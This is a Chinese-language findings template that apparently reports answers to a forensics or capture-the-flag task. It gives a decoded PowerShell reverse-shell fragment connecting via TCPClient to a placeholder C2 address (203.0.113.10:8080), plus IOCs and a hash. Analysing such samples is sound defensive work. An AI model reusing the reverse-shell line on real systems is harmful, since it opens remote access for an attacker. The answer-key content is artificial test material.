# FINDING: [任務代號_簡短名稱] 成果回報

## 1. 成果回報資訊
- **對應任務**：`TASK_[任務代號]`
- **解決小題**：`Q03, Q04`
- **解答 Session**：`Session-Cursor`
- **完成時間**：`YYYY-MM-DD HH:MM:SS UTC`

---

## 2. 核心結論與關鍵答案 (Direct Answers)
*(直接列出可填入 questions.md 的標準答案，精簡無廢話)*

- **解密後明文指令**：
  ```powershell
  $client = New-Object System.Net.Sockets.TCPClient("203.0.113.10",8080);
  ```
- **萃取出之 IOC**：
  - **C2 IP**：`203.0.113.10`
  - **C2 Port**：`8080`
  - **落地路徑**：`C:\Users\Public\update.exe`
  - **計算之 SHA-256**：`8D5D5BBDCCB82A10AC28E2779BA0821F12DA3E1F08F03EC467CE213A6FCCF38C`

---

## 3. 分析推演細節與證據支撐 (Technical Evidence)
*(簡述分析過程，供 Lead Session 進行三級信心等級審核)*
1. Base64 解碼後為 UTF-16LE 編碼的 PowerShell 反彈 Shell。
2. 語法中直接呼叫 .NET `TCPClient` 物件對外建立連線。
3. 經比對 VirusTotal / 威脅情報，該特徵高度符合 Empire / Metasploit Stager。
